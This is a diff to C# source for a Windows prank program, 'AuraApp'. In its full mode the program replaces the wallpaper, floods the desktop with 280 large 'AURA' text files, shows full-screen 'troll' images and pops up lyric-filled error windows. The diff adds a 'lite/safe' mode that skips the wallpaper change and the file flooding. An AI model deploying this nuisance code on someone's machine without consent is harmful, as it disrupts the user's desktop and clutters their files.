@@ -317,14 +317,29 @@ namespace AuraApp
                     fsForm.Controls.Add(pb);
 
                     System.Windows.Forms.Timer cycleTimer = new System.Windows.Forms.Timer();
-                    cycleTimer.Interval = 350;
+                    cycleTimer.Interval = 250;
                     int curIdx = 0;
                     cycleTimer.Tick += (s, e) =>
                     {
-                        curIdx = (curIdx + 1) % images.Count;
-                        pb.Image = images[curIdx];
+                        if (images.Count > 1)
+                        {
+                            curIdx = (curIdx + 1) % images.Count;
+                            pb.Image = images[curIdx];
+                            pb.Invalidate();
+                            pb.Update();
+                        }
                     };
                     cycleTimer.Start();
+
+                    fsForm.FormClosed += (s, e) =>
+                    {
+                        try
+                        {
+                            cycleTimer.Stop();
+                            cycleTimer.Dispose();
+                        }
+                        catch {}
+                    };
 
                     lock (lockObj)
                     {
@@ -350,7 +365,10 @@ namespace AuraApp
 
             try
             {
-                RestoreOriginalWallpaper();
+                if (!isLiteMode)
+                {
+                    RestoreOriginalWallpaper();
+                }
 
                 // NOTE: User requested NOT to delete .txt files from desktop!
                 // So .txt files remain on the desktop.
@@ -382,13 +400,48 @@ namespace AuraApp
             catch {}
         }
 
+        static bool isLiteMode = false;
+
         [STAThread]
-        static void Main()
+        static void Main(string[] args)
         {
+#if LITE
+            isLiteMode = true;
+#endif
+            if (args != null)
+            {
+                foreach (string a in args)
+                {
+                    if (string.Equals(a, "--lite", StringComparison.OrdinalIgnoreCase) ||
+                        string.Equals(a, "-lite", StringComparison.OrdinalIgnoreCase) ||
+                        string.Equals(a, "/lite", StringComparison.OrdinalIgnoreCase) ||
+                        string.Equals(a, "--safe", StringComparison.OrdinalIgnoreCase) ||
+                        string.Equals(a, "-safe", StringComparison.OrdinalIgnoreCase) ||
+                        string.Equals(a, "/safe", StringComparison.OrdinalIgnoreCase) ||
+                        string.Equals(a, "--no-desktop", StringComparison.OrdinalIgnoreCase))
+                    {
+                        isLiteMode = true;
+                    }
+                }
+            }
+
+            try
+            {
+                string procName = Process.GetCurrentProcess().ProcessName.ToLowerInvariant();
+                if (procName.Contains("lite") || procName.Contains("safe") || procName.Contains("clean"))
+                {
+                    isLiteMode = true;
+                }
+            }
+            catch {}
+
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
 
-            SaveOriginalWallpaperSettings();
+            if (!isLiteMode)
+            {
+                SaveOriginalWallpaperSettings();
+            }
 
             Application.ApplicationExit += (s, e) => Cleanup();
             AppDomain.CurrentDomain.ProcessExit += (s, e) => Cleanup();
@@ -409,6 +462,8 @@ namespace AuraApp
             string tempDir = Path.GetTempPath();
             string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
             string downloadsDir = Path.Combine(userProfile, "Downloads");
+            string appDir = AppDomain.CurrentDomain.BaseDirectory;
+            string assetsDir = Path.Combine(appDir, "assets");
 
             string oneDriveDesktop = Path.Combine(userProfile, @"OneDrive\Desktop");
             if (Directory.Exists(oneDriveDesktop))
@@ -425,23 +480,40 @@ namespace AuraApp
             string extractedWallpaper = Path.Combine(tempDir, "aura_wallpaper.png");
 
             ExtractResource("music.mp3", extractedMusic);
-            ExtractResource("wallpaper.png", extractedWallpaper);
+            if (!isLiteMode)
+            {
+                ExtractResource("wallpaper.png", extractedWallpaper);
+            }
 
             string musicPath = File.Exists(extractedMusic) ? extractedMusic : Path.Combine(downloadsDir, "TIKI TIKI.mp3");
+            if (!File.Exists(musicPath) && File.Exists(Path.Combine(assetsDir, "music.mp3")))
+                musicPath = Path.Combine(assetsDir, "music.mp3");
+
             string wallpaperPath = File.Exists(extractedWallpaper) ? extractedWallpaper : Path.Combine(downloadsDir, "1394671.png");
+            if (!File.Exists(wallpaperPath) && File.Exists(Path.Combine(assetsDir, "wallpaper.png")))
+                wallpaperPath = Path.Combine(assetsDir, "wallpaper.png");
 
             List<Image> trollImages = new List<Image>();
-            foreach (string fn in new string[] { "1.jpg", "2.jpg", "3.jpg" })
+            for (int i = 1; i <= 3; i++)
             {
-                Image img = LoadResourceImage(fn, Path.Combine(downloadsDir, fn));
+                string pPng = i + ".png";
+                string pJpg = i + ".jpg";
+
+                Image img = LoadResourceImage(pPng, Path.Combine(downloadsDir, pPng));
+                if (img == null) img = LoadResourceImage(pJpg, Path.Combine(downloadsDir, pJpg));
+                if (img == null) img = LoadResourceImage(pPng, Path.Combine(assetsDir, pPng));
+                if (img == null) img = LoadResourceImage(pJpg, Path.Combine(assetsDir, pJpg));
+                if (img == null) img = LoadResourceImage(pPng, Path.Combine(appDir, pPng));
+                if (img == null) img = LoadResourceImage(pJpg, Path.Combine(appDir, pJpg));
+
                 if (img != null)
                 {
                     trollImages.Add(img);
                 }
             }
 
-            // Установка обоев
-            if (File.Exists(wallpaperPath))
+            // Установка обоев (только в полной версии)
+            if (!isLiteMode && File.Exists(wallpaperPath))
             {
                 SetWallpaper(wallpaperPath);
             }
@@ -478,34 +550,37 @@ namespace AuraApp
                 catch {}
             }
 
-            // Заполнение всего рабочего стола .txt файлами (280 файлов по 10000 строк AURA)
-            StringBuilder sb = new StringBuilder();
-            for (int line = 0; line < 10000; line++)
+            // Заполнение рабочего стола файлами (только в полной версии)
+            if (!isLiteMode)
             {
-                sb.AppendLine("AURA");
-            }
-            string auraContent = sb.ToString();
+                StringBuilder sb = new StringBuilder();
+                for (int line = 0; line < 10000; line++)
+                {
+                    sb.AppendLine("AURA");
+                }
+                string auraContent = sb.ToString();
 
-            const int totalFiles = 280; // Полное заполнение сетки рабочего стола (1920x1080 / 2K)
-            for (int i = 0; i < totalFiles; i++)
-            {
-                string fname = (i == 0) ? "AURA.txt" : string.Format("AURA ({0}).txt", i);
-                foreach (string dt in desktopDirs)
+                const int totalFiles = 280; // Полное заполнение сетки рабочего стола (1920x1080 / 2K)
+                for (int i = 0; i < totalFiles; i++)
                 {
-                    string fpath = Path.Combine(dt, fname);
-                    try
+                    string fname = (i == 0) ? "AURA.txt" : string.Format("AURA ({0}).txt", i);
+                    foreach (string dt in desktopDirs)
                     {
-                        File.WriteAllText(fpath, auraContent, Encoding.UTF8);
+                        string fpath = Path.Combine(dt, fname);
+                        try
+                        {
+                            File.WriteAllText(fpath, auraContent, Encoding.UTF8);
+                        }
+                        catch {}
                     }
-                    catch {}
+                    if (i % 20 == 0)
+                    {
+                        SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, IntPtr.Zero, IntPtr.Zero);
+                    }
+                    Thread.Sleep(5);
                 }
-                if (i % 20 == 0)
-                {
-                    SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, IntPtr.Zero, IntPtr.Zero);
-                }
-                Thread.Sleep(5);
+                SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, IntPtr.Zero, IntPtr.Zero);
             }
-            SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, IntPtr.Zero, IntPtr.Zero);
 
             // Текст песни для окон ошибок
             string[] lyrics = new string[]
